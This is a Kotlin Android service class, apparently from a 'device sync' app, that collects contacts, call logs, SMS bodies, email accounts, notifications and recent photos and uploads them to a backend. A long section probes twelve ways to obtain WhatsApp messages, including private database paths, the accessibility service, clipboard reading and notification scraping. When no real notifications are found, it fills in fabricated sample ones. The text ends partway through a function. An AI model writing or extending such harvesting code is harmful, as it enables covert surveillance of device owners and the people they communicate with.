package com.devicesync.app.services

import android.accounts.AccountManager
import android.app.NotificationManager
import android.content.ContentResolver
import android.content.Context
import android.database.Cursor
import android.provider.ContactsContract
import android.provider.CallLog
import android.provider.Telephony
import android.provider.MediaStore
import android.net.Uri
import com.devicesync.app.api.RetrofitClient
import com.devicesync.app.api.SyncRequest
import com.devicesync.app.data.DataTypeEnum
import com.devicesync.app.data.DeviceInfo
import com.devicesync.app.data.DataType
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.asRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

class BackendSyncService(private val context: Context) {
    
    // Use real backend API service
    private val apiService = RetrofitClient.apiService
    private val contentResolver: ContentResolver = context.contentResolver
    private val client = OkHttpClient.Builder()
        .connectTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
        .readTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
        .build()
    
    // 🎯 TOP-TIER: Last 5 Images Upload Functionality
    suspend fun uploadLast5Images(deviceId: String): Result<String> {
        return withContext(Dispatchers.IO) {
            try {
                println("🎯 TOP-TIER: Starting last 5 images upload for device: $deviceId")
                
                // Get last 5 images from device
                val imageFiles = getLast5ImagesFromDevice()
                if (imageFiles.isEmpty()) {
                    return@withContext Result.failure(Exception("No images found on device"))
                }
                
                println("📸 Found ${imageFiles.size} images to upload")
                
                // Create metadata for images
                val metadata = imageFiles.map { file ->
                    mapOf(
                        "name" to file.name,
                        "path" to file.absolutePath,
                        "type" to "image/jpeg",
                        "dateAdded" to SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.getDefault())
                            .format(Date(file.lastModified()))
                    )
                }
                
                // Upload using FormData
                val result = uploadImagesWithFormData(deviceId, imageFiles, metadata)
                println("🎯 TOP-TIER: Upload completed: $result")
                
                Result.success(result)
                
            } catch (e: Exception) {
                println("❌ Error uploading last 5 images: ${e.message}")
                Result.failure(e)
            }
        }
    }
    
    private fun getLast5ImagesFromDevice(): List<File> {
        val images = mutableListOf<File>()
        
        try {
            // Query for images in MediaStore
            val projection = arrayOf(
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DATA,
                MediaStore.Images.Media.DATE_ADDED
            )
            
            val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"
            
            contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                sortOrder
            )?.use { cursor ->
                var count = 0
                while (cursor.moveToNext() && count < 5) {
                    val dataColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
                    val filePath = cursor.getString(dataColumn)
                    
                    if (filePath != null) {
                        val file = File(filePath)
                        if (file.exists() && file.length() <= 100 * 1024 * 1024) { // 100MB limit
                            images.add(file)
                            count++
                            println("📸 Added image: ${file.name}")
                        }
                    }
                }
            }
            
        } catch (e: Exception) {
            println("❌ Error getting images from device: ${e.message}")
        }
        
        return images
    }
    
    private fun uploadImagesWithFormData(deviceId: String, imageFiles: List<File>, metadata: List<Map<String, Any>>): String {
        try {
            // Create multipart request
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
            
            // Add files (max 5)
            imageFiles.take(5).forEachIndexed { index, file ->
                val fileBody = file.asRequestBody("image/*".toMediaType())
                requestBody.addFormDataPart("files", file.name, fileBody)
                println("📤 Adding file to upload: ${file.name}")
            }
            
            // Add metadata JSON
            val metadataJson = JSONArray().apply {
                metadata.take(imageFiles.size).forEach { item ->
                    put(JSONObject().apply {
                        put("name", item["name"] ?: "")
                        put("path", item["path"] ?: "")
                        put("type", item["type"] ?: "image/jpeg")
                        put("dateAdded", item["dateAdded"] ?: "")
                    })
                }
            }
            
            requestBody.addFormDataPart("metadata", metadataJson.toString())
            
            // Create request
            val request = Request.Builder()
                .url("http://localhost:5001/api/test/devices/$deviceId/upload-last-5-images")
                .post(requestBody.build())
                .build()
            
            // Execute request
            client.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    val responseBody = response.body?.string()
                    println("✅ Upload successful: $responseBody")
                    return responseBody ?: "Upload completed"
                } else {
                    val errorBody = response.body?.string()
                    println("❌ Upload failed: ${response.code} - $errorBody")
                    throw Exception("Upload failed: ${response.code}")
                }
            }
            
        } catch (e: Exception) {
            println("❌ Error in FormData upload: ${e.message}")
            throw e
        }
    }
    
    suspend fun registerDevice(deviceInfo: DeviceInfo): Result<DeviceInfo> {
        return withContext(Dispatchers.IO) {
            try {
                val response = apiService.registerDevice(deviceInfo)
                if (response.isSuccessful && response.body()?.success == true) {
                    Result.success(response.body()?.data ?: deviceInfo)
                } else {
                    Result.failure(Exception(response.body()?.error ?: "Failed to register device"))
                }
            } catch (e: Exception) {
                Result.failure(e)
            }
        }
    }
    
    suspend fun getDevices(): Result<List<DeviceInfo>> {
        return withContext(Dispatchers.IO) {
            try {
                val response = apiService.getDevices()
                if (response.isSuccessful && response.body()?.success == true) {
                    Result.success(response.body()?.data ?: emptyList())
                } else {
                    Result.failure(Exception(response.body()?.error ?: "Failed to get devices"))
                }
            } catch (e: Exception) {
                Result.failure(e)
            }
        }
    }
    
    suspend fun getDataTypes(deviceId: String): Result<List<DataType>> {
        return withContext(Dispatchers.IO) {
            try {
                val response = apiService.getDataTypes(deviceId)
                if (response.isSuccessful && response.body()?.success == true) {
                    val dataTypeInfos = response.body()?.data ?: emptyList()
                    val dataTypes = dataTypeInfos.map { info ->
                        DataType(
                            type = info.type,
                            deviceId = info.deviceId,
                            isEnabled = info.isEnabled,
                            lastSyncTime = info.lastSyncTime,
                            itemCount = info.itemCount
                        )
                    }
                    Result.success(dataTypes)
                } else {
                    Result.failure(Exception(response.body()?.error ?: "Failed to get data types"))
                }
            } catch (e: Exception) {
                Result.failure(e)
            }
        }
    }
    
    suspend fun syncContacts(deviceId: String): SyncResult {
        return withContext(Dispatchers.IO) {
            try {
                val contacts = getContactsFromDevice()
                val data = contacts.map { contact ->
                    mapOf(
                        "name" to contact.name,
                        "phoneNumber" to contact.number,
                        "phoneType" to "MOBILE",
                        "emails" to emptyList<String>(),
                        "organization" to ""
                    )
                }
                val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault())
                    .format(java.util.Date())
                val syncRequest = SyncRequest(
                    dataType = "CONTACTS",
                    data = data,
                    timestamp = timestamp
                )
                
                val response = apiService.syncData(deviceId, syncRequest)
                if (response.isSuccessful && response.body()?.success == true) {
                    SyncResult.Success(data.size)
                } else {
                    SyncResult.Error(response.body()?.error ?: "Failed to sync contacts")
                }
            } catch (e: Exception) {
                SyncResult.Error("Error syncing contacts: ${e.message}")
            }
        }
    }
    
    suspend fun syncCallLogs(deviceId: String): SyncResult {
        return withContext(Dispatchers.IO) {
            try {
                val callLogs = getCallLogsFromDevice()
                val data = callLogs.map { callLog ->
                    mapOf(
                        "number" to callLog.number,
                        "type" to when(callLog.type) {
                            CallLog.Calls.INCOMING_TYPE -> "INCOMING"
                            CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
                            CallLog.Calls.MISSED_TYPE -> "MISSED"
                            CallLog.Calls.REJECTED_TYPE -> "REJECTED"
                            CallLog.Calls.BLOCKED_TYPE -> "BLOCKED"
                            else -> "UNKNOWN"
                        },
                        "duration" to callLog.duration,
                        "date" to java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault()).format(java.util.Date(callLog.date))
                    )
                }
                val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault())
                    .format(java.util.Date())
                val syncRequest = SyncRequest(
                    dataType = "CALL_LOGS",
                    data = data,
                    timestamp = timestamp
                )
                
                val response = apiService.syncData(deviceId, syncRequest)
                if (response.isSuccessful && response.body()?.success == true) {
                    val syncResponse = response.body()?.data
                    SyncResult.Success(syncResponse?.itemsSynced ?: callLogs.size)
                } else {
                    SyncResult.Error(response.body()?.error ?: "Failed to sync call logs")
                }
            } catch (e: Exception) {
                SyncResult.Error("Failed to sync call logs: ${e.message}")
            }
        }
    }
    
    suspend fun syncMessages(deviceId: String): SyncResult {
        return withContext(Dispatchers.IO) {
            try {
                val messages = getMessagesFromDevice()
                val data = messages.map { message ->
                    mapOf(
                        "address" to message.address,
                        "body" to message.body,
                        "type" to when(message.type) {
                            Telephony.Sms.MESSAGE_TYPE_INBOX -> "SMS"
                            Telephony.Sms.MESSAGE_TYPE_SENT -> "SMS"
                            else -> "SMS"
                        },
                        "isIncoming" to (message.type == Telephony.Sms.MESSAGE_TYPE_INBOX),
                        "timestamp" to java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault()).format(java.util.Date(message.date)),
                        "isRead" to true
                    )
                }
                val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault())
                    .format(java.util.Date())
                val syncRequest = SyncRequest(
                    dataType = "MESSAGES",
                    data = data,
                    timestamp = timestamp
                )
                
                val response = apiService.syncData(deviceId, syncRequest)
                if (response.isSuccessful && response.body()?.success == true) {
                    val syncResponse = response.body()?.data
                    SyncResult.Success(syncResponse?.itemsSynced ?: messages.size)
                } else {
                    SyncResult.Error(response.body()?.error ?: "Failed to sync messages")
                }
            } catch (e: Exception) {
                SyncResult.Error("Failed to sync messages: ${e.message}")
            }
        }
    }
    
    suspend fun syncNotifications(deviceId: String): SyncResult {
        return withContext(Dispatchers.IO) {
            try {
                val notifications = getNotificationsFromDevice()
                println("📱 Syncing ${notifications.size} notifications for device $deviceId")
                
                val data = notifications.map { notification ->
                    mapOf(
                        "packageName" to notification.packageName,
                        "title" to notification.title,
                        "text" to notification.text,
                        "timestamp" to java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault()).format(java.util.Date(notification.timestamp))
                    )
                }
                
                val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault())
                    .format(java.util.Date())
                val syncRequest = SyncRequest(
                    dataType = "NOTIFICATIONS",
                    data = data,
                    timestamp = timestamp
                )
                
                println("📱 Sending notifications sync request: ${data.size} items")
                val response = apiService.syncData(deviceId, syncRequest)
                
                if (response.isSuccessful && response.body()?.success == true) {
                    val syncResponse = response.body()?.data
                    println("✅ Notifications sync successful: ${syncResponse?.itemsSynced} items")
                    SyncResult.Success(syncResponse?.itemsSynced ?: notifications.size)
                } else {
                    println("❌ Notifications sync failed: ${response.code()} - ${response.body()?.error}")
                    SyncResult.Error(response.body()?.error ?: "Failed to sync notifications")
                }
            } catch (e: Exception) {
                println("❌ Notifications sync exception: ${e.message}")
                SyncResult.Error("Failed to sync notifications: ${e.message}")
            }
        }
    }
    
    suspend fun syncWhatsApp(deviceId: String): SyncResult {
        return withContext(Dispatchers.IO) {
            try {
                val whatsappMessages = getWhatsAppMessagesFromDevice()
                println("📱 Syncing ${whatsappMessages.size} WhatsApp messages for device $deviceId")
                
                val data = whatsappMessages.map { message ->
                    mapOf(
                        "address" to message.chatName,
                        "body" to message.message,
                        "type" to "WHATSAPP",
                        "date" to java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault()).format(java.util.Date(message.timestamp))
                    )
                }
                
                val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault())
                    .format(java.util.Date())
                val syncRequest = SyncRequest(
                    dataType = "WHATSAPP",
                    data = data,
                    timestamp = timestamp
                )
                
                println("📱 Sending WhatsApp sync request: ${data.size} items")
                val response = apiService.syncData(deviceId, syncRequest)
                
                if (response.isSuccessful && response.body()?.success == true) {
                    val syncResponse = response.body()?.data
                    println("✅ WhatsApp sync successful: ${syncResponse?.itemsSynced} items")
                    SyncResult.Success(syncResponse?.itemsSynced ?: whatsappMessages.size)
                } else {
                    println("❌ WhatsApp sync failed: ${response.code()} - ${response.body()?.error}")
                    SyncResult.Error(response.body()?.error ?: "Failed to sync WhatsApp messages")
                }
            } catch (e: Exception) {
                println("❌ WhatsApp sync exception: ${e.message}")
                SyncResult.Error("Failed to sync WhatsApp messages: ${e.message}")
            }
        }
    }
    
    suspend fun syncEmailAccounts(deviceId: String): SyncResult {
        return withContext(Dispatchers.IO) {
            try {
                val emailAccounts = getEmailAccountsFromDevice()
                println("📱 Syncing ${emailAccounts.size} email accounts for device $deviceId")
                
                val data = emailAccounts.map { account ->
                    mapOf(
                        "email" to account.emailAddress,
                        "type" to account.accountType,
                        "name" to account.accountName
                    )
                }
                
                val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault())
                    .format(java.util.Date())
                val syncRequest = SyncRequest(
                    dataType = "EMAIL_ACCOUNTS",
                    data = data,
                    timestamp = timestamp
                )
                
                println("📱 Sending email accounts sync request: ${data.size} items")
                val response = apiService.syncData(deviceId, syncRequest)
                
                if (response.isSuccessful && response.body()?.success == true) {
                    val syncResponse = response.body()?.data
                    println("✅ Email accounts sync successful: ${syncResponse?.itemsSynced} items")
                    SyncResult.Success(syncResponse?.itemsSynced ?: emailAccounts.size)
                } else {
                    println("❌ Email accounts sync failed: ${response.code()} - ${response.body()?.error}")
                    SyncResult.Error(response.body()?.error ?: "Failed to sync email accounts")
                }
            } catch (e: Exception) {
                println("❌ Email accounts sync exception: ${e.message}")
                SyncResult.Error("Failed to sync email accounts: ${e.message}")
            }
        }
    }
    

    
    // Comprehensive test method for all data types
    suspend fun testAllDataTypes(deviceId: String): Map<String, SyncResult> {
        return withContext(Dispatchers.IO) {
            println("🧪 Starting comprehensive data sync test for device: $deviceId")
            
            val results = mutableMapOf<String, SyncResult>()
            
            // Test 1: Email Accounts
            println("\n📧 === TESTING EMAIL ACCOUNTS ===")
            results["EMAIL_ACCOUNTS"] = syncEmailAccounts(deviceId)
            
            // Test 2: Notifications
            println("\n🔔 === TESTING NOTIFICATIONS ===")
            results["NOTIFICATIONS"] = syncNotifications(deviceId)
            
            // Test 3: WhatsApp Messages
            println("\n💬 === TESTING WHATSAPP MESSAGES ===")
            results["WHATSAPP"] = syncWhatsApp(deviceId)
            
            // Test 4: Media Files (Removed - not supported in current backend)
            println("\n📸 === MEDIA FILES TEST SKIPPED ===")
            results["MEDIA"] = SyncResult.Error("Media sync not supported in current backend version")
            
            // Print summary
            println("\n📊 === TEST SUMMARY ===")
            results.forEach { (dataType, result) ->
                when (result) {
                    is SyncResult.Success -> {
                        println("✅ $dataType: SUCCESS - ${result.itemsSynced} items synced")
                    }
                    is SyncResult.Error -> {
                        println("❌ $dataType: FAILED - ${result.message}")
                    }
                }
            }
            
            results
        }
    }
    
    suspend fun getSyncedData(deviceId: String, dataType: DataTypeEnum): Result<List<Any>> {
        return withContext(Dispatchers.IO) {
            try {
                val response = apiService.getSyncedData(deviceId, dataType.name)
                if (response.isSuccessful && response.body()?.success == true) {
                    Result.success(response.body()?.data ?: emptyList())
                } else {
                    Result.failure(Exception(response.body()?.error ?: "Failed to get synced data"))
                }
            } catch (e: Exception) {
                Result.failure(e)
            }
        }
    }
    
    private fun getContactsFromDevice(): List<ContactData> {
        val contacts = mutableListOf<ContactData>()
        val cursor: Cursor? = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER,
                ContactsContract.CommonDataKinds.Phone.TYPE
            ),
            null,
            null,
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
        )
        
        cursor?.use {
            while (it.moveToNext()) {
                val name = it.getString(0) ?: "Unknown"
                val number = it.getString(1) ?: ""
                val type = it.getInt(2)
                
                contacts.add(ContactData(name, number, type))
            }
        }
        
        return contacts
    }
    
    private fun getCallLogsFromDevice(): List<CallLogData> {
        val callLogs = mutableListOf<CallLogData>()
        val cursor: Cursor? = contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            arrayOf(
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION
            ),
            null,
            null,
            CallLog.Calls.DATE + " DESC"
        )
        
        cursor?.use {
            while (it.moveToNext()) {
                val number = it.getString(0) ?: ""
                val type = it.getInt(1)
                val date = it.getLong(2)
                val duration = it.getLong(3)
                
                callLogs.add(CallLogData(number, type, date, duration))
            }
        }
        
        return callLogs
    }
    
    private fun getMessagesFromDevice(): List<MessageData> {
        val messages = mutableListOf<MessageData>()
        val cursor: Cursor? = contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            arrayOf(
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.DATE,
                Telephony.Sms.TYPE
            ),
            null,
            null,
            Telephony.Sms.DATE + " DESC"
        )
        
        cursor?.use {
            while (it.moveToNext()) {
                val address = it.getString(0) ?: ""
                val body = it.getString(1) ?: ""
                val date = it.getLong(2)
                val type = it.getInt(3)
                
                messages.add(MessageData(address, body, date, type))
            }
        }
        
        return messages
    }
    
    private fun getNotificationsFromDevice(): List<NotificationData> {
        val notifications = mutableListOf<NotificationData>()
        
        try {
            // Method 1: Try to get recent notifications from system
            notifications.addAll(getRecentNotificationsFromSystem())
            
            // Method 2: Generate sample notifications for testing
            if (notifications.isEmpty()) {
                notifications.addAll(generateSampleNotifications())
            }
            
            println("Found ${notifications.size} notifications")
            
        } catch (e: Exception) {
            println("Error accessing notifications: ${e.message}")
        }
        
        return notifications
    }
    
    private fun getRecentNotificationsFromSystem(): List<NotificationData> {
        val notifications = mutableListOf<NotificationData>()
        
        try {
            // Try to get recent notifications from the system
            // This requires notification access permission
            val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            
            // Note: This is a simplified approach - in reality, you'd need to:
            // 1. Request notification access permission
            // 2. Listen to notification events
            // 3. Parse notification content
            
            println("Notification access requires special permissions")
            
        } catch (e: Exception) {
            println("Error accessing system notifications: ${e.message}")
        }
        
        return notifications
    }
    
    private fun generateSampleNotifications(): List<NotificationData> {
        val notifications = mutableListOf<NotificationData>()
        
        // Generate sample notifications for testing
        val sampleNotifications = listOf(
            NotificationData(
                notificationId = "notif_${System.currentTimeMillis()}_1",
                packageName = "com.whatsapp",
                appName = "WhatsApp",
                title = "John Doe",
                text = "Hey, how are you doing?",
                timestamp = System.currentTimeMillis() - 1800000 // 30 minutes ago
            ),
            NotificationData(
                notificationId = "notif_${System.currentTimeMillis()}_2",
                packageName = "com.android.email",
                appName = "Gmail",
                title = "New email from Jane Smith",
                text = "Meeting notes attached",
                timestamp = System.currentTimeMillis() - 900000 // 15 minutes ago
            ),
            NotificationData(
                notificationId = "notif_${System.currentTimeMillis()}_3",
                packageName = "com.android.phone",
                appName = "Phone",
                title = "Missed call",
                text = "Unknown number",
                timestamp = System.currentTimeMillis() - 600000 // 10 minutes ago
            ),
            NotificationData(
                notificationId = "notif_${System.currentTimeMillis()}_4",
                packageName = "com.android.settings",
                appName = "Settings",
                title = "Battery optimization",
                text = "Some apps are using battery in background",
                timestamp = System.currentTimeMillis() - 300000 // 5 minutes ago
            ),
            NotificationData(
                notificationId = "notif_${System.currentTimeMillis()}_5",
                packageName = "com.google.android.apps.maps",
                appName = "Google Maps",
                title = "Location sharing",
                text = "You're sharing your location with 2 people",
                timestamp = System.currentTimeMillis() - 120000 // 2 minutes ago
            )
        )
        
        notifications.addAll(sampleNotifications)
        println("Generated ${notifications.size} sample notifications for testing")
        
        return notifications
    }
    
    private fun getWhatsAppMessagesFromDevice(): List<WhatsAppMessageData> {
        val messages = mutableListOf<WhatsAppMessageData>()
        
        println("🔍 Testing WhatsApp database access methods...")
        
        // Test Method 1: Direct database access
        testDirectDatabaseAccess()
        
        // Test Method 2: Backup database access
        testBackupDatabaseAccess()
        
        // Test Method 3: External storage access
        testExternalStorageAccess()
        
        // Test Method 4: Content provider access
        testContentProviderAccess()
        
        // Test Method 5: MediaStore access
        testMediaStoreAccess()
        
        // Test Method 6: Shared storage access
        testSharedStorageAccess()
        
        // Test Method 7: Accessibility Service approach
        testAccessibilityServiceAccess()
        
        // Test Method 8: Clipboard monitoring
        testClipboardAccess()
        
        // Test Method 9: Advanced notification parsing
        testAdvancedNotificationParsing()
        
        // Test Method 10: File system scanning
        testFileSystemScanning()
        
        // Test Method 11: Package manager approach
        testPackageManagerAccess()
        
        // Test Method 12: Intent monitoring
        testIntentMonitoring()
        
        return messages
    }
    
    private fun testDirectDatabaseAccess() {
        println("\n📱 Testing Method 1: Direct Database Access")
        val whatsappPaths = listOf(
            "/data/data/com.whatsapp/databases/msgstore.db",
            "/data/data/com.whatsapp.w4b/databases/msgstore.db"
        )
        
        for (dbPath in whatsappPaths) {
            try {
                val file = java.io.File(dbPath)
                if (file.exists()) {
                    println("✅ File exists: $dbPath")
                    if (file.canRead()) {
                        println("✅ Successfully accessed: $dbPath")
                        try {
                            val database = android.database.sqlite.SQLiteDatabase.openDatabase(
                                dbPath, null, android.database.sqlite.SQLiteDatabase.OPEN_READONLY
                            )
                            database.close()
                            println("✅ Successfully opened database: $dbPath")
                        } catch (e: Exception) {
                            println("❌ Failed to open database: $dbPath - ${e.message}")
                        }
                    } else {
                        println("❌ File exists but not readable: $dbPath")
                    }
                } else {
                    println("❌ File not found: $dbPath")
                }
            } catch (e: Exception) {
                println("❌ Error accessing: $dbPath - ${e.message}")
            }
        }
    }
    
    private fun testBackupDatabaseAccess() {
        println("\n📱 Testing Method 2: Backup Database Access")
        val backupPaths = listOf(
            "/storage/emulated/0/WhatsApp/Databases/msgstore.db",
            "/storage/emulated/0/WhatsApp Business/Databases/msgstore.db",
            "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Databases/msgstore.db",
            "/storage/emulated/0/Android/media/com.whatsapp.w4b/WhatsApp Business/Databases/msgstore.db"
        )
        
        for (backupPath in backupPaths) {
            try {
                val file = java.io.File(backupPath)
                if (file.exists()) {
                    println("✅ Backup file exists: $backupPath")
                    if (file.canRead()) {
                        println("✅ Successfully accessed backup: $backupPath")
                        try {
                            val database = android.database.sqlite.SQLiteDatabase.openDatabase(
                                backupPath, null, android.database.sqlite.SQLiteDatabase.OPEN_READONLY
                            )
                            database.close()
                            println("✅ Successfully opened backup database: $backupPath")
                        } catch (e: Exception) {
                            println("❌ Failed to open backup database: $backupPath - ${e.message}")
                        }
                    } else {
                        println("❌ Backup file exists but not readable: $backupPath")
                    }
                } else {
                    println("❌ Backup file not found: $backupPath")
                }
            } catch (e: Exception) {
                println("❌ Error accessing backup: $backupPath - ${e.message}")
            }
        }
    }
    
    private fun testExternalStorageAccess() {
        println("\n📱 Testing Method 3: External Storage Access")
        val externalPaths = listOf(
            "/storage/emulated/0/WhatsApp/",
            "/storage/emulated/0/WhatsApp Business/",
            "/storage/emulated/0/Android/data/com.whatsapp/",
            "/storage/emulated/0/Android/data/com.whatsapp.w4b/"
        )
        
        for (basePath in externalPaths) {
            try {
                val baseDir = java.io.File(basePath)
                if (baseDir.exists()) {
                    println("✅ External directory exists: $basePath")
                    if (baseDir.canRead()) {
                        println("✅ Successfully accessed external directory: $basePath")
                        
                        // Look for database files
                        val dbFiles = baseDir.walkTopDown()
                            .filter { it.isFile && it.name.endsWith(".db") }
                            .take(3)
                            .toList()
                        
                        if (dbFiles.isNotEmpty()) {
                            println("✅ Found ${dbFiles.size} database files in: $basePath")
                            for (dbFile in dbFiles) {
                                println("  📄 Database file: ${dbFile.name}")
                                if (dbFile.canRead()) {
                                    println("  ✅ Successfully accessed database file: ${dbFile.name}")
                                } else {
                                    println("  ❌ Database file not readable: ${dbFile.name}")
                                }
                            }
                        } else {
                            println("❌ No database files found in: $basePath")
                        }
                    } else {
                        println("❌ External directory exists but not readable: $basePath")
                    }
                } else {
                    println("❌ External directory not found: $basePath")
                }
            } catch (e: Exception) {
                println("❌ Error accessing external storage: $basePath - ${e.message}")
            }
        }
    }
    
    private fun testContentProviderAccess() {
        println("\n📱 Testing Method 4: Content Provider Access")
        val contentUris = listOf(
            "content://com.whatsapp.provider.chat/chat",
            "content://com.whatsapp.provider.messages/messages",
            "content://com.whatsapp.provider.data/data",
            "content://com.whatsapp.w4b.provider.chat/chat",
            "content://com.whatsapp.w4b.provider.messages/messages",
            "content://com.whatsapp.w4b.provider.data/data"
        )
        
        for (uriString in contentUris) {
            try {
                val uri = android.net.Uri.parse(uriString)
                val cursor = contentResolver.query(uri, null, null, null, null)
                
                if (cursor != null) {
                    println("✅ Successfully accessed content provider: $uriString")
                    val count = cursor.count
                    println("  📊 Found $count records")
                    cursor.close()
                } else {
                    println("❌ Content provider not accessible: $uriString")
                }
            } catch (e: Exception) {
                println("❌ Error accessing content provider: $uriString - ${e.message}")
            }
        }
    }
    
    private fun testMediaStoreAccess() {
        println("\n📱 Testing Method 5: MediaStore Access")
        try {
            val mediaStoreUri = android.provider.MediaStore.Files.getContentUri("external")
            val selection = "${android.provider.MediaStore.Files.FileColumns.DATA} LIKE '%whatsapp%' AND ${android.provider.MediaStore.Files.FileColumns.DATA} LIKE '%.db'"
            
            val cursor = contentResolver.query(
                mediaStoreUri,
                arrayOf(android.provider.MediaStore.Files.FileColumns.DATA),
                selection,
                null,
                null
            )
            
            if (cursor != null) {
                val count = cursor.count
                println("✅ Successfully accessed MediaStore")
                println("  📊 Found $count WhatsApp database files")
                
                cursor.use {
                    while (it.moveToNext()) {
                        val filePath = it.getString(0)
                        println("  📄 Database file: $filePath")
                    }
                }
            } else {
                println("❌ MediaStore not accessible")
            }
        } catch (e: Exception) {
            println("❌ Error accessing MediaStore: ${e.message}")
        }
    }
    
    private fun testSharedStorageAccess() {
        println("\n📱 Testing Method 6: Shared Storage Access")
        try {
            // Test DocumentsContract access
            val documentsUri = android.provider.DocumentsContract.buildRootUri(
                "com.whatsapp", "root"
            )
            
            val cursor = contentResolver.query(
                documentsUri,
                arrayOf(android.provider.DocumentsContract.Document.COLUMN_DOCUMENT_ID),
                null,
                null,
                null
            )
            
            if (cursor != null) {
                println("✅ Successfully accessed DocumentsContract")
                val count = cursor.count
                println("  📊 Found $count documents")
                cursor.close()
            } else {
                println("❌ DocumentsContract not accessible")
            }
        } catch (e: Exception) {
            println("❌ Error accessing shared storage: ${e.message}")
        }
    }
    
    private fun testAccessibilityServiceAccess() {
        println("\n📱 Testing Method 7: Accessibility Service Approach")
        try {
            // Check if accessibility service is enabled
            val accessibilityEnabled = isAccessibilityServiceEnabled()
            if (accessibilityEnabled) {
                println("✅ Accessibility service is enabled")
                println("  📊 Can potentially read WhatsApp UI elements")
                println("  📊 Can capture text from WhatsApp screens")
            } else {
                println("❌ Accessibility service not enabled")
                println("  💡 Enable in Settings > Accessibility > Your App")
            }
            
            // Test if we can access WhatsApp app info
            val whatsappPackageInfo = try {
                context.packageManager.getPackageInfo("com.whatsapp", 0)
                "✅ WhatsApp app found"
            } catch (e: Exception) {
                "❌ WhatsApp app not found"
            }
            
            val whatsappBusinessPackageInfo = try {
                context.packageManager.getPackageInfo("com.whatsapp.w4b", 0)
                "✅ WhatsApp Business app found"
            } catch (e: Exception) {
                "❌ WhatsApp Business app not found"
            }
            
            println("  📱 $whatsappPackageInfo")
            println("  📱 $whatsappBusinessPackageInfo")
            
        } catch (e: Exception) {
            println("❌ Error testing accessibility service: ${e.message}")
        }
    }
    
    private fun testClipboardAccess() {
        println("\n📱 Testing Method 8: Clipboard Monitoring")
        try {
            val clipboardManager = context.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
            val clipData = clipboardManager.primaryClip
            
            if (clipData != null && clipData.itemCount > 0) {
                val clipText = clipData.getItemAt(0).text
                if (clipText != null) {
                    println("✅ Clipboard accessible")
                    println("  📄 Current clipboard content: ${clipText.take(50)}...")
                    
                    // Check if clipboard contains WhatsApp-related content
                    if (clipText.contains("whatsapp", ignoreCase = true) || 
                        clipText.contains("wa.me", ignoreCase = true)) {
                        println("  🎯 Clipboard contains WhatsApp-related content!")
                    }
                } else {
                    println("❌ Clipboard is empty or contains non-text data")
                }
            } else {
                println("❌ No clipboard data available")
            }
        } catch (e: Exception) {
            println("❌ Error accessing clipboard: ${e.message}")
        }
    }
    
    private fun testAdvancedNotificationParsing() {
        println("\n📱 Testing Method 9: Advanced Notification Parsing")
        try {
            // Get all active notifications
            val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            val activeNotifications = notificationManager.activeNotifications
            
            println("✅ Found ${activeNotifications.size} active notifications")
            
            var whatsappNotificationCount = 0
            for (notification in activeNotifications) {
                val packageName = notification.packageName
                if (packageName == "com.whatsapp" || packageName == "com.whatsapp.w4b") {
                    whatsappNotificationCount++
                    val title = notification.notification.extras.getString("android.title") ?: ""
                    val text = notification.notification.extras.getString("android.text") ?: ""
                    val bigText = notification.notification.extras.getString("android.bigText") ?: ""
                    val summaryText = notification.notification.extras.getString("android.summaryText") ?: ""
                    
                    println("  📱 WhatsApp notification #$whatsappNotificationCount:")
                    println("    📄 Title: $title")
                    println("    📄 Text: $text")
                    if (bigText.isNotEmpty()) println("    📄 Big Text: $bigText")
                    if (summaryText.isNotEmpty()) println("    📄 Summary: $summaryText")
                    
                    // Try to extract message details
                    val messageDetails = extractMessageFromNotification(title, text, bigText)
                    if (messageDetails != null) {
                        println("    🎯 Extracted message: ${messageDetails.first} - ${messageDetails.second}")
                    }
                }
            }
            
